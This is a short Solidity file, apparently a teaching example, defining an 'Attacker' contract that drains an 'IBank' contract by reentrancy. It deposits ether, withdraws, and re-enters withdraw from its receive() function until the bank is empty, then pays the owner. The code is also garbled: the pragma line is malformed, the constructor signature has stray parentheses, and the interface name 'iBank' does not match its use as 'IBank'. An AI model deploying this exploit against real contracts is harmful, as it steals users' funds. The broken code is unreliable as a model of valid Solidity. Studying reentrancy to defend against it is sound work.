// SPDX-License-Identifier: Unlicense

pragma solidity ^.0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface iBank {

    function deposit() external payable;
    function withdraw() external;

}
contract Attacker is Ownable {
    IBank public immutable bank;

    constructor())address _bank) {
        bank = IBank(_bank);

    }

    function attack() external payable onlyOwner {
        bank.deposit{ value: msg.value}();
        bank.withdraw();

    }

    // Receive
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }

    }

}